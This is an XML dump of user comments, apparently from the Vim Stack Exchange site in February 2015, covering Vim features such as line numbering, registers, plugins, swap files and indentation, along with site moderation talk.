<?xml version="1.0" encoding="utf-8"?>
<comments>
  <row Id="1" PostId="7" Score="2" Text="Does the norelativenumber just turn off numbering altogether or does it switch to conventional numbering?" CreationDate="2015-02-03T16:59:22.723" UserId="11" />
  <row Id="2" PostId="10" Score="2" Text="It would be useful if you would explain what this does and how to set it up, not everyone will know ;)" CreationDate="2015-02-03T17:01:10.577" UserId="5" />
  <row Id="3" PostId="7" Score="0" Text="`set number` is the setting that controls the presences of numbers so it will only switch between rel and non-rel" CreationDate="2015-02-03T17:05:04.487" UserId="27" />
  <row Id="4" PostId="19" Score="0" Text="http://stackoverflow.com/questions/14650788/why-ci-and-ci-ci-behave-differently" CreationDate="2015-02-03T17:11:04.327" UserId="46" />
  <row Id="5" PostId="22" Score="1" Text="Is it really that easy? *facepalm*. I can't believe I didn't figure that out.." CreationDate="2015-02-03T17:12:27.673" UserId="5" />
  <row Id="6" PostId="13" Score="2" Text="I haven't used them so I don't know if either are suitable or quiality, but here are two Android apps which give some degree of vim control: [VimTouch](https://play.google.com/store/apps/details?id=net.momodalo.app.vimtouch) and [Terminal IDE](https://play.google.com/store/apps/details?id=com.spartacusrex.spartacuside)" CreationDate="2015-02-03T17:18:52.427" UserId="58" />
  <row Id="7" PostId="13" Score="0" Text="The main unknown for me with these tools is: is it easy/feasible to edit remote files through them, with netrw or otherwise?" CreationDate="2015-02-03T17:19:49.063" UserId="58" />
  <row Id="8" PostId="13" Score="1" Text="The start might be using something like the Android &quot;Hacker's Keyboard&quot; https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard as on screen keyboard. I can imagine more touch support, though (for placing cursor, scrolling, ...)" CreationDate="2015-02-03T17:20:18.437" UserId="59" />
  <row Id="9" PostId="7" Score="2" Text="The `numbers.vim` plugin also adds some more advanced relative number functionality, e.g. having the line your cursor occupies printing the non-relative number, and switching to non-relative numbering throughout the whole file when the vim window loses focus." CreationDate="2015-02-03T17:22:00.173" UserId="14" />
  <row Id="10" PostId="7" Score="1" Text="@shawndumas so is there a precedence of which numbers are shown? If for instance I had set number in my vimrc and set relativenumber / norelativenumber was called could it toggle between relative and standard numbering?" CreationDate="2015-02-03T17:29:18.397" UserId="11" />
  <row Id="12" PostId="43" Score="0" Text="Do I need to activate the ftplugin somehow or will creating the file(s) activate it automatically?" CreationDate="2015-02-03T17:37:51.433" UserId="12" />
  <row Id="13" PostId="43" Score="0" Text="Make sure you have `filetype plugin indent on` in your `vimrc`." CreationDate="2015-02-03T17:38:45.987" UserId="54" />
  <row Id="15" PostId="14" Score="8" Text="Use `:0put=…` to avoid the blank line at the top." CreationDate="2015-02-03T17:40:22.717" UserId="54" />
  <row Id="18" PostId="59" Score="3" Text="Sleuth seems to work a bit better than detectindent, in my experience, and also will try to determine the proper indent settings for new files by looking at other files nearby in the filesystem." CreationDate="2015-02-03T17:45:20.463" UserId="15" />
  <row Id="19" PostId="59" Score="0" Text="@jamessan didn't know that, good to know." CreationDate="2015-02-03T17:47:37.837" UserId="74" />
  <row Id="20" PostId="57" Score="1" Text="`/var/tmp` is always world writable—it's a system temp directory. (Well, you can change it to not be, but that's one of those things where Unix-like systems are happy to let you keep the pieces after you break it). If you have another user on the system, he/she could create `/var/tmp/vim_«your_username»` with permissions of his/her choice. And then fill it with symlinks to your important files, which will probably be destroyed by vim tempfiles." CreationDate="2015-02-03T17:51:39.550" UserId="31" />
  <row Id="21" PostId="57" Score="0" Text="@derobert Only if it doesn't exist. If you use this system-wide and havea lot of users, you probably want to add the creation of this directory to `adduser` or whatever you're using to make users. In any case, most people use Vim on trusted machines (but your comment is a good one, as such)." CreationDate="2015-02-03T17:56:49.640" UserId="51" />
  <row Id="22" PostId="71" Score="2" Text="A shortcut for a horizontal split is `:sp`, with the vertical shortcut being `:vsp`." CreationDate="2015-02-03T17:59:45.460" UserId="14" />
  <row Id="23" PostId="57" Score="0" Text="Correct, only if it doesn't exist. Which, being in a system temporary directory, happens unpredictably based on when those tempfiles are cleaned up. Not sure why you don't just put it in `$HOME` somewhere." CreationDate="2015-02-03T17:59:46.110" UserId="31" />
  <row Id="24" PostId="68" Score="1" Text="See [this](https://github.com/panozzaj/vim-autocorrect)" CreationDate="2015-02-03T18:07:08.683" UserId="97" />
  <row Id="25" PostId="57" Score="0" Text="@derobert Well, `/var/` is a different filesystem. The theory is, that it will prevent a lot of writes on `/`, `/usr`, or `/home`, leading to less fragmentation &amp; risk of file corruption in case of a crash... This is also why mailboxes and stuff are on `/var` by default, and not in the homedir..." CreationDate="2015-02-03T18:07:34.540" UserId="51" />
  <row Id="28" PostId="82" Score="3" Text="The [YouCompleteMe plugin](http://valloric.github.io/YouCompleteMe/) can learn terms to autocomplete, and can understand C family languages." CreationDate="2015-02-03T18:16:58.293" UserId="67" />
  <row Id="29" PostId="77" Score="2" Text="possible duplicate of [How do I make Vim adapt to the current indenting style of the file I'm editing?](http://vi.stackexchange.com/questions/52/how-do-i-make-vim-adapt-to-the-current-indenting-style-of-the-file-im-editing)" CreationDate="2015-02-03T18:19:28.793" UserId="53" />
  <row Id="30" PostId="82" Score="0" Text="@alxndr Documentation was pretty confusing for me-in case for installation with vundle. And as soon as I started out with it , YCM server crashed!" CreationDate="2015-02-03T18:19:58.220" UserId="101" />
  <row Id="31" PostId="85" Score="6" Text="IMHO this question is off-topic because it is too broad, in addition, it's basically asking for &quot;what's the best VimScript tutorial&quot; (even though it isn't phrased like that). I don't think we want to have questions asking for off-site resources..." CreationDate="2015-02-03T18:20:28.533" UserId="51" />
  <row Id="34" PostId="41" Score="0" Text="johannes: Do we need to edit the .vimrc through vim for this command to automatically source the file?" CreationDate="2015-02-03T18:25:02.157" UserId="95" />
  <row Id="35" PostId="35" Score="2" Text="+1 for `[p` and `]p`" CreationDate="2015-02-03T18:33:08.723" UserId="50" />
  <row Id="38" PostId="82" Score="0" Text="YCM works for me relatively well, unless I have template heavy (boost.geo) stuff where it adds looooots of laod to the system. My setup is a mess meanwhile, hard to extract YCM parts ..." CreationDate="2015-02-03T18:43:21.940" UserId="59" />
  <row Id="39" PostId="60" Score="0" Text="To the editor (Jasper): I more likely want to write again something that I have written recently, not something I'll write in the future or that is at the beginning of the file. Therefore `^P` is more natural IMHO. Otherwise thanks for the edit (I hope I clicked the right button and you got your +2)." CreationDate="2015-02-03T18:48:04.520" UserId="82" />
  <row Id="40" PostId="98" Score="2" Text="Isn't it ``gn``?" CreationDate="2015-02-03T18:50:11.957" UserId="82" />
  <row Id="41" PostId="100" Score="0" Text="+1 This is a rather nice answer, on-the-spot and reasonably detailed at the same time. Let's hope most questions get such answers! :)" CreationDate="2015-02-03T18:51:50.367" UserId="82" />
  <row Id="42" PostId="60" Score="0" Text="Yep, I got those imaginary internet points :) I always thought that the suggestion list would be sorted alphabetically..." CreationDate="2015-02-03T18:53:32.450" UserId="79" />
  <row Id="43" PostId="90" Score="1" Text="... and `g5j` to jump 5 down, as usual." CreationDate="2015-02-03T18:53:41.580" UserId="82" />
  <row Id="44" PostId="98" Score="0" Text="@yo' Yes, though g is just another flag, you'd want to use `g` too if you feel there may be more than one matches per line, which is often true. For the purpose of the question however the flag `n` is more important." CreationDate="2015-02-03T18:53:59.373" UserId="74" />
  <row Id="45" PostId="108" Score="0" Text="For me, `Y` also yanks the whole line. Is this nonstandard? I usually prefer `Y` over `yy`. There is a difference however between `D` and `dd`." CreationDate="2015-02-03T18:55:22.867" UserId="79" />
  <row Id="46" PostId="60" Score="0" Text="@Jasper order of appearance it is (at least for me certainly, also see above: `world,word,wood` and not the other way around). So `^P` is the last used completion, which is very handy (I rarely go further than 3 items in the list, even in a long file)." CreationDate="2015-02-03T18:55:32.963" UserId="82" />
  <row Id="47" PostId="76" Score="0" Text="Have you ever tried `:sp`(`lit`) or `:vs`(`plit`) with no argument? :)" CreationDate="2015-02-03T18:57:04.507" UserId="82" />
  <row Id="48" PostId="105" Score="3" Text="Isn't `Ctrl+G` more like 'path relative to vim's cwd'?" CreationDate="2015-02-03T18:58:17.127" UserId="79" />
  <row Id="49" PostId="108" Score="0" Text="@Jasper Oh, sorry, answering from mobile and don't have an actual Vim instance to test. Edited." CreationDate="2015-02-03T19:00:40.600" UserId="88" />
  <row Id="50" PostId="85" Score="1" Text="@Carpetsmoker I do not agree! We can have questions listing other online resources on the topic. Since SE is community-driven, if a resource gets out-dated, disappears, changes link etc., there is always someone to correct it. However, I think I agree that it's better to keep such question for later, because _they are very tricky_." CreationDate="2015-02-03T19:01:19.353" UserId="82" />
  <row Id="51" PostId="5" Score="0" Text="Now I tried this, and it's a schyzo! I mean, confusing. :D" CreationDate="2015-02-03T19:02:36.753" UserId="82" />
  <row Id="52" PostId="107" Score="0" Text="`pkdd` ? (It's one keypress less for the `Shift`)" CreationDate="2015-02-03T19:04:36.923" UserId="82" />
  <row Id="53" PostId="112" Score="3" Text="In my opinion, this is both too broad (asking for just a big list) and primarily opinion based (there's no way to tell whether an answer is objectively &quot;correct&quot;)." CreationDate="2015-02-03T19:06:40.397" UserId="88" />
  <row Id="54" PostId="105" Score="0" Text="@Jasper Good catch! Updated the answer." CreationDate="2015-02-03T19:06:52.937" UserId="53" />
  <row Id="55" PostId="112" Score="0" Text="As a beginner, `u` is my best friend.. Is there a reason you feel it's not enough of a safety net?" CreationDate="2015-02-03T19:07:21.240" UserId="40" />
  <row Id="56" PostId="107" Score="0" Text="that would be `pkdd` :)" CreationDate="2015-02-03T19:08:29.337" UserId="79" />
  <row Id="57" PostId="107" Score="0" Text="What did you say? :p" CreationDate="2015-02-03T19:09:41.853" UserId="82" />
  <row Id="58" PostId="112" Score="0" Text="backup. backup. backup... I once did a halfdrunk fumble-finger in `mutt` and deleted my entire INBOX (never figured out what I did exactly). These sort of errors can occur in any keyboard-based program..." CreationDate="2015-02-03T19:16:24.370" UserId="51" />
  <row Id="59" PostId="82" Score="0" Text="@yo' This question is fairly specific to using vim with C++. Solutions for it probably won't apply to someone who uses Vim to write Perl (and vice versa). So [tag:c++] seems fine to me; but of course [meta] is the right place to discuss that." CreationDate="2015-02-03T19:17:39.313" UserId="31" />
  <row Id="61" PostId="112" Score="0" Text="@Carpetsmoker (off-topic) `D` `.` `&lt;enter&gt;` would do it..." CreationDate="2015-02-03T19:22:30.873" UserId="31" />
  <row Id="62" PostId="113" Score="1" Text="I agree with vimtutor. I learned from there. It's the best tutorial.&#xA;As for the 4th bullet do not forget `:x` along with `:wq`." CreationDate="2015-02-03T19:24:44.263" UserId="83" />
  <row Id="64" PostId="63" Score="0" Text="Start with `vimtutor` for the first 30 minutes. Continue with real practice for the rest of the week. Boom! You can fluently use Vim and have all its pros." CreationDate="2015-02-03T19:28:52.723" UserId="83" />
  <row Id="65" PostId="119" Score="3" Text="Details, please!" CreationDate="2015-02-03T19:30:00.667" UserId="24" />
  <row Id="66" PostId="113" Score="1" Text="I think a cation &quot;**do not do that, will destroy your computer**&quot; should be added to any instance of that curse you wrote there. ;)" CreationDate="2015-02-03T19:30:30.913" UserId="82" />
  <row Id="68" PostId="125" Score="2" Text="So for `x` I'd use `&quot;_x` then?" CreationDate="2015-02-03T19:43:12.580" UserId="134" />
  <row Id="69" PostId="125" Score="0" Text="That's correct." CreationDate="2015-02-03T19:44:46.717" UserId="132" />
  <row Id="70" PostId="129" Score="1" Text="Are you looking for an &quot;revert&quot; action? `:e!` would do that" CreationDate="2015-02-03T19:48:52.027" UserId="79" />
  <row Id="75" PostId="129" Score="0" Text="Just pressing `u` doesn't do what you want?" CreationDate="2015-02-03T20:03:41.177" UserId="135" />
  <row Id="78" PostId="132" Score="0" Text="Note: typing `:runtime macros/matchit.vim` doesn't work; you need to put in in your vimrc and restart Vim..." CreationDate="2015-02-03T20:10:58.733" UserId="51" />
  <row Id="79" PostId="139" Score="1" Text="If `:w` did happen, will `:earlier 30s` still work?" CreationDate="2015-02-03T20:12:44.720" UserId="134" />
  <row Id="80" PostId="139" Score="1" Text="`:earlier 30s` restores the buffer to the state it was in 30 seconds ago. After reverting, you would then have to save it using `:w`." CreationDate="2015-02-03T20:13:51.853" UserId="24" />
  <row Id="82" PostId="129" Score="1" Text="I think `:e!` would be bad if you haven't saved since the last correct state, and `u` might be insufficient if you typed a bunch of stuff. (If you typed `date month`, for example, then you would have deleted a tag, set a mark, and performed a search, which would be quite confusing to undo via `u`.)" CreationDate="2015-02-03T20:19:45.203" UserId="142" />
  <row Id="84" PostId="43" Score="1" Text="@DeltaLima vim has a path that it goes through to check for settings. As long as `filetype plugin on` is set, vim's path includes the `ftplugin/&lt;filetype&gt;.vim` and `after/ftplugin/&lt;filetype&gt;/vim` files in its path." CreationDate="2015-02-03T20:24:10.423" UserId="130" />
  <row Id="85" PostId="145" Score="2" Text="Imagine there are an unknown number of lines and/or paragraphs between the cursor and its top-level `module` line. (Specifically, this situation arose when I was recently navigating third-party code several thousand lines long, with accurate indentation but no empty lines, and trying to find the outer context of a module's definition.)" CreationDate="2015-02-03T20:25:21.197" UserId="67" />
  <row Id="86" PostId="148" Score="0" Text="right; e.g., `VaB:s/\$color/replaced/g`" CreationDate="2015-02-03T20:25:39.137" UserId="142" />
  <row Id="87" PostId="148" Score="0" Text="Just added that, good point :)" CreationDate="2015-02-03T20:26:23.817" UserId="150" />
  <row Id="88" PostId="145" Score="0" Text="I can imagine (and I'm horrified)... Yeah, me too I'm interested in an exact solution for the situation that you describe. Till then, I'd jump paragraph by paragraph as a &quot;workaround&quot;" CreationDate="2015-02-03T20:27:50.450" UserId="135" />
  <row Id="89" PostId="129" Score="1" Text="@WChargin Not speaking about a `u` being part of the sequence, performing some undos in the middle." CreationDate="2015-02-03T20:28:35.793" UserId="82" />
  <row Id="90" PostId="145" Score="0" Text="Jumping by paragraphs is my preferred way of moving around, but it wasn't an option: the entire file was one &quot;paragraph&quot;." CreationDate="2015-02-03T20:29:20.130" UserId="67" />
  <row Id="91" PostId="149" Score="4" Text="Why not use `less`?" CreationDate="2015-02-03T20:33:10.680" UserId="66" />
  <row Id="92" PostId="149" Score="1" Text="Do you intend to manipulate the files in any way, or do you just want to view them?" CreationDate="2015-02-03T20:33:13.227" UserId="24" />
  <row Id="93" PostId="140" Score="0" Text="An additional plugin suggestion: NERD Commenter - http://www.vim.org/scripts/script.php?script_id=1218" CreationDate="2015-02-03T20:33:20.077" UserId="138" />
  <row Id="94" PostId="149" Score="1" Text="I would like to edit the files." CreationDate="2015-02-03T20:33:42.863" UserId="77" />
  <row Id="95" PostId="108" Score="0" Text="When you have `autoindent` on, `Vp` will trigger a reindent of the next line. `VP` will work better in that case." CreationDate="2015-02-03T20:33:52.060" UserId="135" />
  <row Id="96" PostId="7" Score="1" Text="that is most correct" CreationDate="2015-02-03T20:43:38.530" UserId="27" />
  <row Id="97" PostId="152" Score="0" Text="I love vim, there is always something to learn and discover to make life easier and on a daily basis :)" CreationDate="2015-02-03T20:43:56.280" UserId="137" />
  <row Id="99" PostId="43" Score="0" Text="@DeltaLima, please see my edit." CreationDate="2015-02-03T20:49:32.913" UserId="54" />
  <row Id="100" PostId="149" Score="0" Text="related: http://stackoverflow.com/a/19795855/732016" CreationDate="2015-02-03T20:56:18.390" UserId="142" />
  <row Id="102" PostId="62" Score="0" Text="+1 for the article. It can really change your view on the way of using windows in vim. [Here](https://github.com/jeetsukumaran/vim-filebeagle) is another filesystem navigation plugin inspired by it." CreationDate="2015-02-03T21:02:28.787" UserId="20" />
  <row Id="103" PostId="116" Score="0" Text="Can't you just read `:help recording`?" CreationDate="2015-02-03T21:10:21.900" UserId="54" />
  <row Id="104" PostId="8" Score="0" Text="Not sure exactly but the first changelog its mentioned in is 7.3.&#xA;ftp://ftp.vim.org/pub/vim/patches/7.3/README" CreationDate="2015-02-03T21:10:30.617" UserId="19" />
  <row Id="105" PostId="107" Score="0" Text="That's &quot;register&quot;, not &quot;buffer&quot;." CreationDate="2015-02-03T21:11:38.837" UserId="54" />
  <row Id="107" PostId="116" Score="5" Text="@romainl That's obvious in retrospect, but not to someone who is stuck." CreationDate="2015-02-03T21:11:57.777" UserId="24" />
  <row Id="109" PostId="122" Score="0" Text="[Jasper found](http://meta.vi.stackexchange.com/questions/45/what-do-we-do-with-questions-that-are-already-answered-somewhere-else-on-se) similar questions on [so]: [Any way to delete in vim without overwriting your last yank? [duplicate]](http://stackoverflow.com/questions/3638542/any-way-to-delete-in-vim-without-overwriting-your-last-yank) and [In vim is there a way to delete without putting text in the register?](http://stackoverflow.com/questions/54255/in-vim-is-there-a-way-to-delete-without-putting-text-in-the-register)" CreationDate="2015-02-03T21:13:51.753" UserId="8" />
  <row Id="110" PostId="144" Score="0" Text="While I do think having your dotfiles under version control is awesome, I was specifically asking about instances of vim running on the same machine (I've updated the question)." CreationDate="2015-02-03T21:14:40.257" UserId="126" />
  <row Id="112" PostId="174" Score="4" Text="As an aside, I wouldn't recommend using the numbered registers.  The only &quot;safe&quot; registers are the alphabetic registers.  All other registers are automatically set by Vim." CreationDate="2015-02-03T21:23:25.590" UserId="15" />
  <row Id="114" PostId="176" Score="0" Text="Agreed about the numeric registers—but what if you want to use this in a command, and you need registers that start the same but become different?" CreationDate="2015-02-03T21:30:48.223" UserId="142" />
  <row Id="115" PostId="176" Score="0" Text="@WChargin, please explain." CreationDate="2015-02-03T21:31:59.727" UserId="54" />
  <row Id="116" PostId="176" Score="0" Text="As in, perhaps I want to do something with rotated copies of a string, so if `abcde` is in `@q`, then I want `@x=&quot;bcdea&quot;`, `@y=&quot;abcde&quot;`, and `@z=&quot;eabcd&quot;`. I might start by letting `@x`, `@y`, and `@z` all equal to `@q` and then modifying them as needed. Obviously, I just made this up, but it seems like there might be *some* cases where something similar might be useful." CreationDate="2015-02-03T21:34:23.170" UserId="142" />
  <row Id="117" PostId="81" Score="1" Text="And to move to the middle of the screen, is &lt;kbd&gt;M&lt;/kbd&gt;, naturally ;-)" CreationDate="2015-02-03T21:34:57.413" UserId="135" />
  <row Id="118" PostId="140" Score="0" Text="Note: this only supports linewise comments. For example, ANSI C does not recognize `//` (only `/* */`)." CreationDate="2015-02-03T21:35:25.180" UserId="142" />
  <row Id="119" PostId="176" Score="0" Text="@WChargin, I'm sorry but I completely fail to see the point of what you describe, especially with regard to registers. It looks like variables to me, not registers." CreationDate="2015-02-03T21:36:12.687" UserId="54" />
  <row Id="120" PostId="175" Score="1" Text="There's no need to use `:exe` here.  The `getreg()` and `setreg()` functions would be cleaner." CreationDate="2015-02-03T21:38:42.500" UserId="15" />
  <row Id="121" PostId="176" Score="0" Text="The solution of using an empty buffer, duplicating and then modifying does solve my problem, but it still remains ineffecient because each modification of the initial string must be yanked and executed or assigned one by one to a register." CreationDate="2015-02-03T21:39:25.937" UserId="161" />
  <row Id="122" PostId="176" Score="2" Text="@Kit, I'm a bit concerned by the lack of practical example in your question which immediately makes it smell like XY. I'm almost certain you are misusing registers so I'd love to read an explanation of what you are trying to do." CreationDate="2015-02-03T21:42:01.450" UserId="54" />
  <row Id="123" PostId="180" Score="1" Text="I'd recommend `getreg(sourceReg, 1)`." CreationDate="2015-02-03T21:45:21.853" UserId="15" />
  <row Id="124" PostId="182" Score="3" Text="What kind of load times are you seeing? 1s, 10s, 1m?" CreationDate="2015-02-03T21:48:20.527" UserId="2" />
  <row Id="125" PostId="5" Score="2" Text="You can also toggle the commands by appending a &quot;!&quot; to them. E.g. `set number!` will turn on line numbering if it's off, and turn it on if it's off.&#xA;`set relativenumber` can be shortened as `set rnu`." CreationDate="2015-02-03T21:48:35.230" UserId="175" />
  <row Id="126" PostId="180" Score="0" Text="Ah yeah, true. Fixed." CreationDate="2015-02-03T21:48:53.837" UserId="132" />
  <row Id="127" PostId="175" Score="0" Text="@jamessan Nice suggestion, thanks—am I using these correctly?" CreationDate="2015-02-03T21:48:57.697" UserId="142" />
  <row Id="128" PostId="169" Score="0" Text="Can `less` or `more` also make changes to my file?" CreationDate="2015-02-03T21:50:23.203" UserId="51" />
  <row Id="129" PostId="175" Score="0" Text="I've edited it to add the optional second argument to getreg() since that returns the contents of the register rather than a possible evaluation of it." CreationDate="2015-02-03T21:53:11.047" UserId="15" />
  <row Id="132" PostId="169" Score="2" Text="They can't, of course. Logs are not meant to be edited." CreationDate="2015-02-03T21:59:45.437" UserId="54" />
  <row Id="133" PostId="189" Score="4" Text="+1 for the &quot;I don't personally recommend using a Vim distribution&quot;" CreationDate="2015-02-03T22:01:36.123" UserId="155" />
  <row Id="134" PostId="60" Score="0" Text="protip: `inoremap &lt;C-Space&gt; &lt;C-N&gt;`" CreationDate="2015-02-03T22:04:27.657" UserId="142" />
  <row Id="135" PostId="51" Score="6" Text="+1. Let me also add that the fact that there will be very few user-visible changes is a good thing." CreationDate="2015-02-03T22:05:08.707" UserId="155" />
  <row Id="136" PostId="192" Score="0" Text="Did you try `:!env`?" CreationDate="2015-02-03T22:10:48.777" UserId="142" />
  <row Id="137" PostId="193" Score="0" Text="See [here](http://stackoverflow.com/questions/5569348/vim-in-ex-command-mode-how-to-complete-the-path-only-up-to-the-first-non-unique).&#xA;&#xA;What do you have `wildmode` set to?" CreationDate="2015-02-03T22:28:06.760" UserId="141" />
  <row Id="138" PostId="195" Score="0" Text="how did you create the animated gif?" CreationDate="2015-02-03T22:32:55.757" UserId="188" />
  <row Id="139" PostId="195" Score="1" Text="@guido I used a custom tool called [mkcast](http://github.com/KeyboardFire/mkcast)." CreationDate="2015-02-03T22:34:12.950" UserId="88" />
  <row Id="140" PostId="195" Score="0" Text="that's awesome thanks" CreationDate="2015-02-03T22:35:05.753" UserId="188" />
  <row Id="141" PostId="196" Score="1" Text="`:help greedy` would have taken you to the right help topic.  `:help regexp` is the help describing Vim's regex flavor." CreationDate="2015-02-03T22:36:32.430" UserId="15" />
  <row Id="142" PostId="82" Score="2" Text="@AbhinavGauniyal That sounds similar to problems I've seen before with using YCM.  What system are you on?  For OSX see [here](https://github.com/Valloric/YouCompleteMe#mac-os-x-super-quick-installation).  I'm not using MacVim, but I installed CMake with Homebrew.  Then I `cd`ed to the YCM plugin directory (`~/.vim/bundle` for me), and ran `./install --clang-completer`." CreationDate="2015-02-03T22:37:38.297" UserId="141" />
  <row Id="143" PostId="176" Score="0" Text="@romainl I added a practical example, I hope it proves illuminating. Could you explain what you mean by 'smell like XY'?" CreationDate="2015-02-03T22:51:22.333" UserId="161" />
  <row Id="144" PostId="200" Score="0" Text="When you exit Vim properly (i.e. with `:wq` or `:q!` or `ZZ` or etc.), swap files should automatically be removed." CreationDate="2015-02-03T22:52:21.970" UserId="88" />
  <row Id="145" PostId="200" Score="1" Text="@Doorknob not when you exit after a recovery... ;-)" CreationDate="2015-02-03T22:52:54.800" UserId="86" />
  <row Id="146" PostId="207" Score="0" Text="I get this behavior even without loading my vimrc (`vim -u NONE`). This is Vim 7.4 on Ubuntu 14.04 with GNOME." CreationDate="2015-02-03T23:05:25.247" UserId="88" />
  <row Id="147" PostId="207" Score="0" Text="@Doorknob&#xA;And I get the window instead of the cursor moving without my `.vimrc` (just `set mouse=a`).&#xA;&#xA;`:help scrolling` says that the scrolling behavior is platform specific.  I'm using vim in iterm2 on OSX." CreationDate="2015-02-03T23:07:31.550" UserId="141" />
  <row Id="148" PostId="207" Score="0" Text="Aha! `:set mouse=a` has fixed the problem for me. Edit that into your answer, and I'll accept it. Thanks!" CreationDate="2015-02-03T23:08:27.547" UserId="88" />
  <row Id="149" PostId="202" Score="0" Text="Could you limit the question to an operating system or windowing environment?" CreationDate="2015-02-03T23:12:36.130" UserId="24" />
  <row Id="150" PostId="202" Score="0" Text="@200_success Alright, I've edited my environment into the question." CreationDate="2015-02-03T23:14:22.553" UserId="88" />
  <row Id="152" PostId="206" Score="1" Text="i couldn't make it work with `&lt;C-v&gt; &lt;C-w&gt;`; I used `autocmd VimResized * wincmd =` in my .vimrc instead" CreationDate="2015-02-03T23:18:45.867" UserId="188" />
  <row Id="153" PostId="202" Score="0" Text="I think this question should be tagged 'terminal' too.  Is it un-editable because it's answered?" CreationDate="2015-02-03T23:21:37.983" UserId="141" />
  <row Id="155" PostId="68" Score="1" Text="@ArturoVolpe That seems like a legitimate answer to the question." CreationDate="2015-02-03T23:28:25.063" UserId="141" />
  <row Id="156" PostId="212" Score="0" Text="That'll work for my example, but I was hoping for a more general answer which could be used in other kinds of string building" CreationDate="2015-02-03T23:37:37.680" UserId="182" />
  <row Id="157" PostId="179" Score="1" Text="I would like to add the the swap files also act as a lock. If you re-open a file, or if someone else does while it is already open, it won't go unnoticed.&#xA;&#xA;It may be a rare case but it has saved me a couple of times." CreationDate="2015-02-03T23:50:03.983" UserId="195" />
  <row Id="158" PostId="212" Score="0" Text="@jalanb You could use `repeat`; see my edit." CreationDate="2015-02-03T23:52:20.157" UserId="88" />
  <row Id="159" PostId="214" Score="0" Text="That worked great. Thanks!" CreationDate="2015-02-03T23:52:54.127" UserId="155" />
  <row Id="161" PostId="213" Score="1" Text="I'm having trouble parsing those commands. Would you mind expanding on them a bit?" CreationDate="2015-02-04T00:18:52.173" UserId="130" />
  <row Id="162" PostId="189" Score="2" Text="@carlosdc Shameless plug but I did a small [rant](http://ricardolovelace.com/blog/2015/01/11/vim-is-not-a-black-box/) on this. Foreign setups introduce undefined behaviour so best to start from scratch." CreationDate="2015-02-04T00:19:36.223" UserId="206" />
  <row Id="163" PostId="216" Score="1" Text="This is true, yes, but it is more than that, actually. It is ex-mode in a repl-like shape." CreationDate="2015-02-04T00:23:24.123" UserId="207" />
  <row Id="164" PostId="221" Score="0" Text="On what distribution is this the case? I am currently running Archlinux and `.md` is being seen as markdown" CreationDate="2015-02-04T00:25:18.893" UserId="73" />
  <row Id="165" PostId="171" Score="0" Text="Another choice would be UndoTree." CreationDate="2015-02-04T00:28:30.687" UserId="207" />
  <row Id="166" PostId="216" Score="0" Text="I know it's the command line mode but I have strangely never used it like that. I use it to check the history `Shift V` to select a line and enter to execute again." CreationDate="2015-02-04T00:28:42.140" UserId="206" />
  <row Id="167" PostId="213" Score="1" Text="/ or ? to search down or up, \%xv limits to search to virtual column number 'x', the 'x' in this case is '&lt;C-R&gt;=virtcol(&quot;.&quot;)&lt;CR&gt;' which runs the virtcol command and inserts the virtual column number the cursor is at into the expression, \S means any non-whitespace character." CreationDate="2015-02-04T00:29:25.613" UserId="81" />
  <row Id="168" PostId="221" Score="0" Text="@Neikos This is on Ubuntu 14.04." CreationDate="2015-02-04T00:30:08.387" UserId="88" />
  <row Id="169" PostId="221" Score="0" Text="on fedora as well I correctly get markdown syntax on .md files" CreationDate="2015-02-04T00:33:21.743" UserId="188" />
  <row Id="170" PostId="221" Score="1" Text="[This has already been answered on SO.](http://stackoverflow.com/a/14779012/1951857)  You may find more and different information there." CreationDate="2015-02-04T00:43:57.027" UserId="141" />
  <row Id="171" PostId="189" Score="0" Text="@iKlsR in fact, that's what I was thinking of when I wrote this ;)" CreationDate="2015-02-04T00:47:47.417" UserId="133" />
  <row Id="172" PostId="84" Score="4" Text="[This has already been asked and answered on SO.](http://stackoverflow.com/questions/11489428/how-to-make-vim-paste-from-and-copy-to-systems-clipboard)  You may find more and different information there." CreationDate="2015-02-04T00:47:58.877" UserId="141" />
  <row Id="173" PostId="163" Score="0" Text="The off-topic answer would be to suggest a VCS. For instance git's index might be useful" CreationDate="2015-02-04T00:52:17.603" UserId="59" />
  <row Id="174" PostId="221" Score="0" Text="possible duplicate of [Setting up ++ft according to the file extension](http://vi.stackexchange.com/questions/61/setting-up-ft-according-to-the-file-extension)" CreationDate="2015-02-04T00:52:32.017" UserId="82" />
  <row Id="175" PostId="222" Score="1" Text="this does not work in fedora, it seems the /usr/share/vim/vim74/filetype.vim definitions will override this setting" CreationDate="2015-02-04T01:01:09.787" UserId="188" />
  <row Id="176" PostId="213" Score="1" Text="Thanks for explaining Chad. I will just add that &lt;C-R&gt; in Insert mode or Command-line mode grabs the contents of a register. The `=` register is the expression register which evaluates an expression in place. It's very handy, if not a bit weird looking." CreationDate="2015-02-04T01:01:29.610" UserId="195" />
  <row Id="177" PostId="231" Score="0" Text="Since I'll be using vim for at least the next 10 years I'd think it worth the investment. Where do I use this for the change to be reasonably permanent?" CreationDate="2015-02-04T01:49:36.223" UserId="211" />
  <row Id="179" PostId="179" Score="0" Text="@superjer Good point.  I forgot to mention that aspect of it.  I'll add info about that to the answer." CreationDate="2015-02-04T02:15:21.103" UserId="15" />
  <row Id="180" PostId="231" Score="0" Text="you should put this in your ~/.vimrc" CreationDate="2015-02-04T02:18:54.787" UserId="74" />
  <row Id="181" PostId="179" Score="1" Text="I would suggest to use `noswapfile` rather than setting the updatecount" CreationDate="2015-02-04T02:37:35.033" UserId="73" />
  <row Id="185" PostId="236" Score="1" Text="Are you talking about pasting code that was originally poorly indented or properly indented code that changes when you paste it into Vim?" CreationDate="2015-02-04T03:39:24.433" UserId="15" />
  <row Id="186" PostId="236" Score="0" Text="The pasted code is poorly indented to start with. Let me include an example...." CreationDate="2015-02-04T03:43:39.817" UserId="86" />
  <row Id="187" PostId="237" Score="2" Text="This question is not about pasting code with indentation, it's about fixing poorly indented code." CreationDate="2015-02-04T03:46:20.317" UserId="86" />
  <row Id="188" PostId="237" Score="3" Text="I didn't see the comment you posted. However, you can still use `gg=G` to reindent the whole file." CreationDate="2015-02-04T03:48:51.517" UserId="224" />
  <row Id="189" PostId="237" Score="0" Text="@rolfl That's where I usually start in such cases: `gg=G`, then look at the parts that `vim` got wrong." CreationDate="2015-02-04T04:08:51.870" UserId="205" />
